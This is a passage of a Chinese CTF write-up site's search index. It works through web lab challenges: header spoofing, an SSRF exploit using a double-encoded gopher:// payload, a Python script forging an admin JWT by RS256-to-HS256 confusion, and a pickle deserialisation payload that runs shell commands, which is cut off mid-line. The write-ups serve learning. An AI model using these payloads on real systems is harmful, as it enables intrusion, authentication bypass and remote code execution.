\u5730\u5740","text":"<p>\u4f2a\u9020 X-Real-IP \u5730\u5740\u624d\u80fd\u8bbf\u95ee</p> <p></p> <p>\u7ed9\u51fa\u4e86\u7528\u6237\u540d\u5bc6\u7801\uff0c\u4f46\u662f\u4e0d\u80fd\u70b9\u51fb</p> <p></p> <p>\u5bc6\u7801\u5728\u6e90\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230</p> <p></p> <p>\u4fee\u6539\u8bf7\u6c42\u65b9\u5f0f\u624b\u52a8\u63d0\u4ea4\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-13/","title":"gopher \u534f\u8bae\u4f2a\u9020 HTTP \u8bf7\u6c42","text":""},{"location":"Web/Chapter3/3-13/#gopher-\u534f\u8bae\u4f2a\u9020-http-\u8bf7\u6c42","title":"gopher \u534f\u8bae\u4f2a\u9020 HTTP \u8bf7\u6c42","text":"<p>\u8001\u6837\u5b50\u76f4\u63a5\u8bbf\u95ee <code>127.0.0.1/flag.php</code>\uff0c\u56de\u663e\u4e00\u4e2a\u8f93\u5165\u6846</p> <p></p> <p>\u67e5\u770b\u6e90\u7801\u62ff\u5230\u4e00\u4e2a Key \u503c</p> <p></p> <p>\u8f93\u5165\u540e\u56de\u8f66\uff0c\u63d0\u793a\u4ec5\u9650 <code>127.0.0.1</code> \u67e5\u770b</p> <p></p> <p>\u6211\u4eec\u5c1d\u8bd5\u7528 file:// \u8bfb\u53d6\u6587\u4ef6,\u5f97\u5230\u5982\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>?url=file:///var/www/html/index.php\n</code></pre> <pre><code>&lt;?php\n\nerror_reporting(0);\n\nif (!isset($_REQUEST['url'])){\n    header(\"Location: /?url=_\");\n    exit;\n}\n\n// \u521d\u59cb\u5316 cURL\uff0c\u8fd9\u662f PHP \u63d0\u4f9b\u7684\u4e00\u4e2a\u53d1\u8d77 HTTP \u8bf7\u6c42\u7684\u5e93\uff0c\u5e95\u5c42\u53ef\u4ee5\u53d1\u8d77 HTTP\u3001HTTPS\u3001FTP\u3001gopher \u7b49\u534f\u8bae\u7684\u8bf7\u6c42\n$ch = curl_init();\n\n// \u5c06\u7528\u6237\u4f20\u5165\u7684 url \u53c2\u6570\u76f4\u63a5\u4f20\u7ed9 cURL \u8bf7\u6c42\u76ee\u6807\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\n\n// CURLOPT_HEADER: 0 \u4e0d\u8fd4\u56de\u54cd\u5e94\u5934\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n\n// CURLOPT_FOLLOWLOCATION, 1: \u5982\u679c\u76ee\u6807\u8fd4\u56de 3xx \u8df3\u8f6c\uff0ccURL \u4f1a\u81ea\u52a8\u8ddf\u968f\u8df3\u8f6c\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n\n// \u6267\u884c\u8bf7\u6c42\ncurl_exec($ch);\n\n// \u5173\u95ed\u8fde\u63a5\uff0c\u91ca\u653e\u8d44\u6e90\ncurl_close($ch);\n</code></pre> <p>\u518d\u8bfb\u53d6 <code>flag.php</code> \u7684</p> <pre><code>?url=file:///var/www/html/flag.php\n</code></pre> <pre><code>&lt;?php\n\n// \u5173\u95ed\u6240\u6709\u9519\u8bef\u62a5\u544a\uff0c\u9632\u6b62\u6cc4\u9732\u654f\u611f\u4fe1\u606f\nerror_reporting(0);\n\n// \u5224\u65ad\u8bf7\u6c42\u6765\u6e90 IP \u662f\u5426\u4e3a\u672c\u5730\u5730\u5740 127.0.0.1\nif ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") {\n    // \u5982\u679c\u4e0d\u662f\u672c\u5730\u8bbf\u95ee\uff0c\u76f4\u63a5\u63d0\u793a\u5e76\u7ec8\u6b62\u811a\u672c\n    echo \"Just View From 127.0.0.1\";\n    return;\n}\n\n// \u4ece\u73af\u5883\u53d8\u91cf\u4e2d\u83b7\u53d6 flag\uff08\u4e00\u822c\u5728\u9776\u573a\u73af\u5883\u4e2d\u8bbe\u7f6e\uff09\n$flag = getenv(\"CTFHUB\");\n\n// \u5bf9 flag \u505a MD5 \u54c8\u5e0c\uff0c\u5f97\u5230 key\n$key = md5($flag);\n\n// \u5224\u65ad\u7528\u6237\u662f\u5426\u901a\u8fc7 POST \u63d0\u4ea4\u4e86 \"key\"\uff0c\u5e76\u4e14\u503c\u4e0e\u670d\u52a1\u5668\u8ba1\u7b97\u7684 $key \u76f8\u540c\nif (isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key) {\n    // \u5982\u679c\u63d0\u4ea4\u6b63\u786e\uff0c\u8fd4\u56de flag\n    echo $flag;  // \u5f53 post \u4f20\u503c\u4e3a key \u65f6\u51fa flag\n    exit;\n}\n?&gt;\n\n&lt;!-- \u7b80\u5355\u7684 HTML \u8868\u5355\uff0c\u5141\u8bb8\u7528\u6237\u63d0\u4ea4 key --&gt;\n&lt;form action=\"/flag.php\" method=\"post\"&gt;\n&lt;input type=\"text\" name=\"key\"&gt;\n&lt;!-- Debug \u4fe1\u606f\uff1a\u5c06\u670d\u52a1\u5668\u7aef\u8ba1\u7b97\u7684 key \u663e\u793a\u5728\u9875\u9762\u4e0a\uff08\u65b9\u4fbf\u5f00\u53d1\u8005\u8c03\u8bd5\uff0c\u6b63\u5e38\u5e94\u5220\u9664\uff09 --&gt;\n&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;\n&lt;/form&gt;\n</code></pre> <p>\u6211\u4eec\u77e5\u9053\u53ea\u8981\u5f80 <code>flag.php</code> \u4f20 key \u503c\u5c31\u53ef\u4ee5\u5f97\u5230 flag</p> <p>\u800c <code>index.php</code> \u53ef\u4ee5\u5229\u7528 curl \u4f20 url</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528 gopher \u534f\u8bae\u5728 <code>index.php</code> \u4e2d\u6784\u9020 POST \u8bf7\u6c42\u5305\u5f80 <code>flag.php</code> \u4f20 Key \u503c\uff0c\u4ee5\u6b64\u83b7\u53d6 flag</p> <p>\u6240\u4ee5\u6211\u4eec\u901a\u8fc7 gopher \u534f\u8bae\u6784\u9020\u4e00\u4e2a\u8bf7\u6c42\uff0c\u914d\u5408 SSRF \u6a21\u62df\u6210\u5185\u7f51\u7528\u6237\u53bb\u8bbf\u95ee\u63d0\u4ea4\u6570\u636e</p> <p>\u6784\u9020\u8fd9\u6837\u7684\u4e00\u4e2a\u8bf7\u6c42</p> <p></p> <p>\u76f4\u63a5 curl \u540e\u63a5 gopher \u534f\u8bae\u5c31\u5148 URL \u7f16\u7801\u4e00\u6b21</p> <p>\u5173\u952e\u7684\u6362\u884c\u7b26\u662f CRLF\uff08\\r\\n\uff09\uff0c\u800c\u4e0d\u662f LF\uff08\\n\uff09\u5355\u72ec\u4f7f\u7528</p> <p>\u56e0\u4e3a gopher:// \u534f\u8bae\u662f**\u6a21\u62df\u539f\u59cb TCP \u5b57\u8282\u6d41**\uff0c\u800c HTTP \u7684\u534f\u8bae\u62a5\u6587\u6362\u884c\u662f <code>\\r\\n</code>\uff0c\u4e0d\u80fd\u53ea\u7528 <code>\\n</code></p> <p>\u5148\u628a\u6362\u884c <code>\\r\\n</code> \u5199\u6210 \u767e\u5206\u53f7\u7f16\u7801\uff08url encode\uff09\uff1a</p> <ul> <li><code>\\r</code> =&gt; <code>%0D</code></li> <li><code>\\n</code> =&gt; <code>%0A</code></li> </ul> <p>\u4e8e\u662f\u53d8\u6210\uff1a</p> <pre><code>POST%20/flag.php%20HTTP/1.1%0D%0A\nHost:%20127.0.0.1:80%0D%0A\nContent-Type:%20application/x-www-form-urlencoded%0D%0A\nContent-Length:%2036%0D%0A\n%0D%0A\nkey=a840f3c56810783306b3a75f861bd31a\n</code></pre> <p>\u6211\u8fd9\u91cc\u601d\u8def\u662f\u5148\u8df3\u5230\u5185\u7f51\u7684 <code>index.php</code> \u4e2d\u518d\u4f20\u5165 POST \u8bf7\u6c42</p> <p>\u6240\u4ee5\u8981 URL \u7f16\u7801\u4e24\u6b21\uff08\u5728\u5411\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u65f6\uff0c\u9996\u5148\u6d4f\u89c8\u5668\u4f1a\u8fdb\u884c\u4e00\u6b21 URL\u89e3\u7801\uff0c\u56e0\u4e3a\u6709\u4e24\u4e2a ?url\uff0c\u6240\u4ee5\u4f1a\u89e3\u7801\u4e24\u6b21\uff0c\u5176\u6b21\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5728\u6267\u884c <code>curl</code> \u529f\u80fd\u65f6\uff0c\u8fdb\u884c\u7b2c\u4e09\u6b21 URL\u89e3\u7801\uff09</p> <p>\u6700\u7ec8\u4f7f\u7528 gopher \u534f\u8bae + \u7aef\u53e3\u4f2a\u9020\u8bf7\u6c42\uff1a</p> <pre><code>?url=gopher://127.0.0.1:80/_\n# _ \u8868\u793a\u4e4b\u540e\u5f00\u59cb\u662f \u539f\u59cb TCP payload\n</code></pre> <p>\u6700\u7ec8 payload\uff1a</p> <pre><code>?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c\n</code></pre> <p></p>"},{"location":"Web/Chapter3/3-14/","title":"JWT \u7be1\u6539\u7b97\u6cd5\u7ed5\u8fc7","text":""},{"location":"Web/Chapter3/3-14/#jwt-\u7be1\u6539\u7b97\u6cd5\u7ed5\u8fc7","title":"JWT \u7be1\u6539\u7b97\u6cd5\u7ed5\u8fc7","text":"<p>\u8f93\u5165 admin/admin \u767b\u5f55\u540e\u7ed9\u51fa\u4e86 JWT \u4ee5\u53ca\u4e00\u4e2a\u5bc6\u94a5</p> <p></p> <p>\u5728 JWT \u4e0a\u89e3\u7801\u53d1\u73b0\u662f RS256 \u7b97\u6cd5</p> <p></p> <p>\u9898\u5e72\u4e2d\u63d0\u793a\u6211\u4eec \u82e5\u4f7f\u7528\u975e\u5bf9\u79f0\u5bc6\u7801\u7b97\u6cd5\u65f6\uff0c\u6709\u65f6\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u5230\u516c\u94a5\uff0c\u6b64\u65f6\u53ef\u901a\u8fc7\u4fee\u6539 JWT \u5934\u90e8\u7684\u7b7e\u540d\u7b97\u6cd5\uff0c\u5c06\u975e\u5bf9\u79f0\u5bc6\u7801\u7b97\u6cd5\u6539\u4e3a\u5bf9\u79f0\u5bc6\u7801\u7b97\u6cd5\uff0c\u4ece\u800c\u8fbe\u5230\u653b\u51fb\u8005\u76ee\u7684</p> <p>\u6b64\u65f6\u767b\u5f55\u540e JWT \u4e2d <code>payload</code> \u7684 <code>role</code> \u662f <code>guest</code>\uff0c\u800c\u53ea\u6709\u5f53 <code>role</code> \u4e3a <code>admin</code> \u65f6\u624d\u80fd\u591f\u5f97\u5230 flag</p> <p>\u6709\u7ed9\u51fa\u4e00\u4e2a\u516c\u94a5</p> <p></p> <p>\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u6539\u7b97\u6cd5\u4e3a <code>HS256</code>\uff0c\u4ee5\u516c\u94a5\u4f5c\u4e3a\u5bc6\u94a5\u6765\u8fdb\u884c\u7b7e\u540d\u548c\u9a8c\u8bc1</p> <p>JWT \u683c\u5f0f\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code># header\uff1a\u6bd4\u5982 {\"alg\": \"RS256\", \"typ\": \"JWT\"}\n# payload\uff1a\u6bd4\u5982 {\"username\": \"admin\", \"role\": \"admin\"}\n# signature\uff1a\u7531\u524d\u4e24\u4e2a\u90e8\u5206\uff08header.payload\uff09+ \u79c1\u94a5\u901a\u8fc7 RS256\uff08\u5373 RSA \u7b7e\u540d\uff09\u751f\u6210\u7684\u7b7e\u540d\nheader.payload.signature\n</code></pre> <p>**\u670d\u52a1\u7aef**\u6839\u636e JWT \u7684\u7b97\u6cd5\u5b57\u6bb5\uff08<code>RS256</code>\uff09\uff1a</p> <ul> <li>\u7528\u201c\u516c\u94a5\u201d\u9a8c\u8bc1\u8fd9\u4e2a\u7b7e\u540d\u662f\u5426\u662f\u7531\u79c1\u94a5\u751f\u6210\u7684</li> <li>\u5982\u679c\u7b7e\u540d\u901a\u8fc7\u9a8c\u8bc1 \u2192 \u8bf4\u660e payload \u6ca1\u88ab\u7be1\u6539</li> <li>\u7136\u540e\u8bfb\u53d6 payload \u5224\u65ad\u662f\u5426\u662f <code>admin</code> \u7b49</li> </ul> <p>\u653b\u51fb\u8005\u7684\u76ee\u6807\u4f2a\u9020\u4e00\u4e2a\u5185\u5bb9\u4e3a</p> <pre><code>{\n  \"username\": \"root\",\n  \"role\": \"admin\"\n}\n</code></pre> <p>\u7684 JWT\uff0c\u8ba9\u670d\u52a1\u7aef\u76f8\u4fe1\u8fd9\u662f\u771f\u7684</p> <p>\u4f46\u653b\u51fb\u8005**\u6ca1\u6709\u79c1\u94a5**\uff0c\u6309\u9053\u7406\u6765\u8bf4\u65e0\u6cd5\u4f2a\u9020 RS256 \u7684\u7b7e\u540d</p> <p>\u5982\u679c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u662f\u8fd9\u6837\u7684</p> <pre><code>$header = JWTHelper::getHeader($token);\n$algs = array_merge(array($header-&gt;alg, $alg));  // \u4f7f\u7528 header \u4e2d\u7684 alg\uff01\nJWT::decode($token, $key, $algs);               // \u4e0d\u5f3a\u5236\u7b97\u6cd5\uff01\n</code></pre> <p>\u8fd9\u5c31\u6709\u95ee\u9898\u4e86\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u628a header \u6539\u6210\uff1a</p> <pre><code>{\"alg\": \"HS256\", \"typ\": \"JWT\"}\n</code></pre> <p>\u4e5f\u5c31\u662f\u544a\u8bc9\u670d\u52a1\u7aef\uff1a\u201c\u8bf7\u7528 HS256\uff08\u5bf9\u79f0\u52a0\u5bc6\uff09\u6765\u9a8c\u8bc1\u6211\u8fd9\u4e2a\u7b7e\u540d\u201d</p> <p>HS256 \u662f\u5bf9\u79f0\u52a0\u5bc6\uff0c\u7b7e\u540d\u548c\u9a8c\u8bc1\u90fd\u9700\u8981\u4e00\u4e2a\u5bc6\u94a5\u3002\u653b\u51fb\u8005\u672c\u6765\u662f\u6ca1\u6709\u5bc6\u94a5\u7684\uff0c\u4f46\u516c\u94a5\u662f\u516c\u5f00\u7684\u554a\uff0c\u4efb\u4f55\u4eba\u90fd\u80fd\u62ff\u5230</p> <p>\u4e8e\u662f\u653b\u51fb\u8005\u5c31\u8fd9\u6837\u505a\u4e86\uff1a</p> <ol> <li>\u6539 header \u4e3a</li> </ol> <pre><code>{\"alg\": \"HS256\", \"typ\": \"JWT\"}\n</code></pre> <ol> <li>\u7528 base64 \u7f16\u7801 header \u548c payload\uff0c\u62fc\u8d77\u6765</li> </ol> <pre><code>base64url(header) + \".\" + base64url(payload)\n</code></pre> <ol> <li>\u7528\u670d\u52a1\u7aef\u7528\u4e8e\u9a8c\u8bc1\u7684\u201c\u516c\u94a5\u201d\u5f53\u4f5c HMAC \u7684\u5bc6\u94a5\u751f\u6210\u7b7e\u540d</li> </ol> <pre><code>hmac.new(public_key, message, sha256).digest()\n</code></pre> <ol> <li>\u62fc\u597d JWT \u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u770b\u5230 alg \u662f <code>HS256</code>\uff0c\u5c31\u771f\u7684\u7528\u5b83\u624b\u91cc\u7684\u201c\u516c\u94a5\u201d\u6765\u9a8c\u8bc1 HMAC</li> </ol> <p>RSA \u516c\u94a5\u662f\u7528\u4e8e\u9a8c\u8bc1\u7b7e\u540d\u7684\uff0c\u800c HMAC \u7684\u5bc6\u94a5\u662f\u7528\u4e8e\u751f\u6210\u7b7e\u540d\u7684\uff0c\u4e24\u8005\u672c\u8d28\u4e0d\u540c</p> <p>\u4f46\u5982\u679c\u670d\u52a1\u7aef\u4ee3\u7801**\u6ca1\u68c0\u67e5 alg \u662f\u5426\u975e\u6cd5\u964d\u7ea7**\u3001\u5141\u8bb8\u4f7f\u7528 HS256\uff0c\u5c31\u4f1a\u88ab\u4f60\u8fd9\u4e2a\u4f2a\u9020 token \u9a97\u8fc7\u53bb\uff01</p> <pre><code># \u5bfc\u5165\u5fc5\u8981\u6a21\u5757\uff1a\n# hmac\uff1a\u7528\u4e8e\u8ba1\u7b97\u6d88\u606f\u8ba4\u8bc1\u7801\uff08MAC\uff09\n# hashlib\uff1a\u63d0\u4f9b\u54c8\u5e0c\u7b97\u6cd5\uff08\u5982 SHA-256\uff09\n# base64\uff1a\u7528\u4e8e base64 \u7f16\u7801 JWT \u7684 header \u548c payload\nimport hmac\nimport hashlib\nimport base64\n\nkey = \"\"\"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAplTDO9hgk4Hm4x3krn9Z\nhoYCHwp63E89U92LucW+13kkALbwM2CvoAzW6HvIgxltTYXy8smsAEtYNj/83KBT\nqYUQWM9IqrzIscQX0eQ3GokMPQR0R3rZjIp6YmTG6ktqucLwy5Np0zn/S5LpRTzQ\nr4UxhIRZfr7lC+B2FlvrqHVPh2ynvpS0vpzmVlS+C4+pJtuXh3Lbg95zWtQB3y/k\nsh4xwM7IZyLJRilfkrhr1Q+G68WAVqNuuVswlpM3A79zC4z+npupwBgZrJl6PhZt\nhqIRs2JdGWffR0kh/aNkcJmq6HCwHNnG0LjwtQUDEHW6K+4rrw9X2H/qCk2qgcVz\n4QIDAQAB\n-----END PUBLIC KEY-----\n\"\"\"\n\n# JWT \u5934\u90e8\uff0c\u58f0\u660e\u7c7b\u578b\u548c\u7b97\u6cd5\n# \u8fd9\u91cc\u5c06\u7b97\u6cd5\u8bbe\u7f6e\u4e3a HS256\uff08\u5bf9\u79f0\u52a0\u5bc6\uff09\uff0c\u8fd9\u5c31\u662f\u653b\u51fb\u70b9\uff1a\u5c06\u539f\u672c\u5e94\u8be5\u662f RS256 \u7684\u975e\u5bf9\u79f0\u7b97\u6cd5\u201c\u964d\u7ea7\u201d\u4e3a\u5bf9\u79f0\u7b97\u6cd5\nheader = '{\"typ\": \"JWT\", \"alg\": \"HS256\"}'\n\n# JWT \u8d1f\u8f7d\uff08Payload\uff09\uff0c\u5176\u4e2d\u5305\u542b\u58f0\u660e\u7684\u7528\u6237\u8eab\u4efd\u548c\u6743\u9650\npayload = '{\"username\": \"root\", \"role\": \"admin\"}'\n\n# \u5bf9 header \u8fdb\u884c base64 URL \u5b89\u5168\u7f16\u7801\uff0c\u5e76\u53bb\u9664\u586b\u5145\u5b57\u7b26 '='\nencodeHBytes = base64.urlsafe_b64encode(header.encode(\"utf-8\"))\nencodeHeader = str(encodeHBytes, \"utf-8\").rstrip(\"=\")\n\n# \u5bf9 payload \u540c\u6837\u8fdb\u884c base64 \u7f16\u7801\u5904\u7406\nencodePBytes = base64.urlsafe_b64encode(payload.encode(\"utf-8\"))\nencodePayload = str(encodePBytes, \"utf-8\").rstrip(\"=\")\n\n# \u62fc\u63a5 header \u548c payload \u90e8\u5206\uff08\u5373\u7b7e\u540d\u524d\u7684 JWT token\uff09\ntoken = (encodeHeader + \".\" + encodePayload)\n\n# \u4f7f\u7528 HMAC-SHA256 \u5bf9\u4e0a\u8ff0 token \u8fdb\u884c\u7b7e\u540d\n# \u26a0\ufe0f \u6ce8\u610f\uff1a\u6b64\u5904\u9519\u8bef\u5730\u4f7f\u7528\u4e86\u201c\u516c\u94a5\u201d\u4f5c\u4e3a HMAC \u5bf9\u79f0\u5bc6\u94a5\uff0c\u8fd9\u662f\u653b\u51fb\u8005\u7684\u201c\u964d\u7ea7\u653b\u51fb\u624b\u6cd5\u201d\n# \u5982\u679c\u540e\u7aef\u672a\u6b63\u786e\u9650\u5236\u7b97\u6cd5\u4e3a RS256\uff0c\u53cd\u800c\u63a5\u53d7 HS256 \u5e76\u7528 public key \u6765\u9a8c\u8bc1 HMAC\uff0c\u5c31\u4f1a\u88ab\u7ed5\u8fc7\u9a8c\u8bc1\nsig = base64.urlsafe_b64encode(\n    hmac.new(bytes(key, \"UTF-8\"), token.encode(\"utf-8\"), hashlib.sha256).digest()\n).decode(\"UTF-8\").rstrip(\"=\")\n\n# \u8f93\u51fa\u5b8c\u6574\u4f2a\u9020\u7684 JWT token\uff08Header.Payload.Signature\uff09\nprint(token + \".\" + sig)\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-2/","title":"\u4f2a\u9020 XFF \u5730\u5740","text":""},{"location":"Web/Chapter3/3-2/#\u4f2a\u9020-xff-\u5730\u5740","title":"\u4f2a\u9020 XFF \u5730\u5740","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e00\u4e2a\u767b\u5f55\u9875\u9762</p> <p></p> <p>F12 \u6e90\u4ee3\u7801\u62ff\u5230 Base64 \u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u540e\u5e94\u8be5\u662f\u767b\u5f55\u5bc6\u7801</p> <p></p> <p>\u7528\u6237\u540d\u662f admin \u767b\u5f55\uff0c\u56de\u663e IP \u7981\u6b62\u8bbf\u95ee</p> <p></p> <p>\u7ed3\u5408\u9898\u76ee\u672c\u5730\u4e24\u5b57\u6dfb\u52a0 X-Forwarded-For \u5934\u4e3a 127.0.0.1</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-3/","title":"\u4f2a\u9020 Referer \u5730\u5740","text":""},{"location":"Web/Chapter3/3-3/#\u4f2a\u9020-referer-\u5730\u5740","title":"\u4f2a\u9020 Referer \u5730\u5740","text":"<p>\u6253\u5f00\u95ee\u54b1\u662f\u4e0d\u662f\u4ece\u8c37\u6b4c\u6765\u7684</p> <p></p> <p>\u6253\u5f00 BurpSuite \u91cd\u65b0\u6293\u5305</p> <p></p> <p>\u53f3\u952e\u53d1\u9001\u5230 Repeater \u6a21\u5757</p> <p></p> <p>\u6dfb\u52a0 Referer \u5b57\u6bb5\u4e3a\u8c37\u6b4c\u7f51\u7ad9\u53d1\u9001\u8bf7\u6c42\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter3/3-4/","title":"\u4f2a\u9020 Cookie","text":""},{"location":"Web/Chapter3/3-4/#\u4f2a\u9020-cookie","title":"\u4f2a\u9020 Cookie","text":"<p>\u6253\u5f00\u7f51\u9875\u5565\u4e5f\u6ca1\u6709\uff0cURL \u6709\u6bb5 Base64 \u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u5f97\u5230 ket.txt</p> <p></p> <p>\u540c\u7406\u7f16\u7801\u8bbf\u95ee index.php</p> <p></p> <p>\u8bbf\u95ee\u6ca1\u4e1c\u897f\uff0c\u6ce8\u610f\u5230 line \u53c2\u6570\u503c\u4e3a\u7a7a</p> <p>\u8fd9\u4e2a\u7ffb\u8bd1\u8fc7\u6765\u662f\u884c\u53f7\u7684\u610f\u601d\uff0c\u8f93\u5165 1 \u5f97\u5230\u56de\u663e</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u8bbf\u95ee\u5f97\u5230\u6e90\u7801</p> <pre><code>import requests\n\na = 30\n\nfor i in range(a):\n    url = \"http://120.24.86.145:8002/index.php?line=\" + str(i) + \"&amp;filename=aW5kZXgucGhw\" \n    s = requests.get(url)\n    print(s.text)\n</code></pre> <pre><code>&lt;?php\n\nerror_reporting(0);\n\n$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");\n\n$line=isset($_GET['line'])?intval($_GET['line']):0;\n\nif($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");\n\n$file_list = array(\n\n'0' =&gt;'keys.txt',\n\n'1' =&gt;'index.php',\n\n);\n\n\n\nif(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){       //\u770b\u8fd9\u91cc\n\n$file_list[2]='keys.php';\n\n}\n\n\n\nif(in_array($file, $file_list)){\n\n$fa = file($file);\n\necho $fa[$line];\n\n}\n\n?&gt;\n</code></pre> <p>\u5173\u952e\u4ee3\u7801\u68c0\u67e5\u6709\u6ca1\u6709\u8bbe\u7f6e Cookie margin\uff0c\u540c\u65f6\u5224\u65ad\u5176\u503c\u662f\u5426\u4e3a margin\uff0c\u6700\u540e\u624d\u80fd\u8bbf\u95ee keys.php \u6587\u4ef6</p> <p>\u6253\u5f00 BurpSuite \u6293\u5305\u62e6\u622a\u8bbe\u7f6e Cookie\uff0c\u540c\u65f6\u4e0d\u8981\u5fd8\u4e86\u7f16\u7801 keys.php\uff0c\u4ee5\u53ca\u5220\u9664 line \u53c2\u6570\u503c</p> <p></p>"},{"location":"Web/Chapter3/3-5/","title":"\u4f2a\u9020\u8bf7\u6c42\u5934","text":""},{"location":"Web/Chapter3/3-5/#\u4f2a\u9020\u8bf7\u6c42\u5934","title":"\u4f2a\u9020\u8bf7\u6c42\u5934","text":"<p>\u67e5\u770b\u6e90\u4ee3\u7801\u7ed9\u51fa\u4e86\u6587\u4ef6</p> <p></p> <p>URL \u62fc\u63a5\u4e0a\u8bbf\u95ee\u56de\u663e</p> <p></p> <p>\u4fee\u6539 Referer \u8bf7\u6c42\u5934\u53c8\u56de\u663e\u4e0d\u662f\u8fd9\u4e2a\u6d4f\u89c8\u5668</p> <p></p> <p>\u6dfb\u52a0 User-Agent\uff0c\u590d\u5236 Chrome \u7684\u8bf7\u6c42\u5934\u5c06\u5173\u952e\u5b57\u6539\u4e00\u4e0b</p> <p></p> <p>\u8981\u672c\u5730\u8bbf\u95ee\u6dfb\u52a0 X-Forwarded-For \u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter3/3-6/","title":"\u4f2a\u9020 Client-IP \u5730\u5740","text":""},{"location":"Web/Chapter3/3-6/#\u4f2a\u9020-client-ip-\u5730\u5740","title":"\u4f2a\u9020 Client-IP \u5730\u5740","text":"<p>\u524d\u9762\u4e24\u9053\u5206\u522b\u662f _ \u66ff\u6362\u4e3a . \u6216 +\uff0c\u7136\u540e\u662f JSFuck</p> <p></p> <p>\u9650\u5236\u4e86 IP \u5730\u5740\u662f 127.0.0.1\uff0c\u4f46\u662f XFF \u7ed5\u8fc7\u65e0\u6548</p> <p>\u5f97\u4f7f\u7528 Client-IP \u7ed5\u8fc7</p> <p>\u81f3\u4e8e<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code> \u53ef\u4ee5\u4f7f\u7528\u4f2a\u534f\u8bae</p> <p><code>change($_GET['file'])</code>\uff0c\u9006\u4e00\u4e0b <code>change()</code> \u65b9\u6cd5\u5c31\u884c</p> <pre><code>/secrettw.php?&amp;file=ZmpdYSZmXGI=&amp;2333=data:text/plain,todat+is+a+happy+day\n</code></pre> <p></p>"},{"location":"Web/Chapter3/3-7/","title":"\u4f2a\u9020 JWT","text":""},{"location":"Web/Chapter3/3-7/#\u4f2a\u9020-jwt","title":"\u4f2a\u9020 JWT","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u63d0\u793a</p> <p></p> <p>\u7f51\u9875\u592a\u591a\u4e86\uff0c\u7528\u811a\u672c\u53bb\u627e</p> <pre><code>import requests\n\nurl=\"http://30b74212-bc6f-465c-8b60-d9aeaa215b75.node4.buuoj.cn:81/shop?page=\"\n\nfor i in range(0,2000):\n    print(i)\n    r=requests.get( url + str(i) )\n    if 'lv6.png' in r.text:\n        print (i)\n        break\n</code></pre> <p></p> <p>\u627e\u5230\u540e\u8d2d\u4e70\u94b1\u4e0d\u591f\uff0c\u4fee\u6539\u524d\u7aef\u4ee3\u7801\u7684\u6298\u6263</p> <p></p> <p>\u8d2d\u4e70\u540e\u663e\u793a\u53ea\u80fd admin \u8bbf\u95ee</p> <p></p> <p>\u67e5\u770b Cookies \u53d1\u73b0\u6709 JWT</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u7834\u89e3\u5bc6\u94a5</p> <p></p> <p>\u53bb\u5728\u7ebf\u7f51\u7ad9\u751f\u6210 admin \u7684 JWT</p> <p></p> <p>\u66ff\u6362\u6389\u5237\u65b0\u7f51\u9875</p> <p></p> <p>\u70b9\u51fb\u540e\u6ca1\u53cd\u5e94\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u6709\u538b\u7f29\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u540e\u62ff\u5230\u6e90\u7801</p> <pre><code>import tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n</code></pre> <p>become \u53c2\u6570\u5b58\u5728 Pickle \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <pre><code>import pickle\nimport urllib\nimport commands\n\n# commands.getoutput \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5e76\u8fd4\u56de\u8f93\u51fa\nclass Try(object):\n    def __reduce__(self):\n        return (commands.getoutput, ('cat 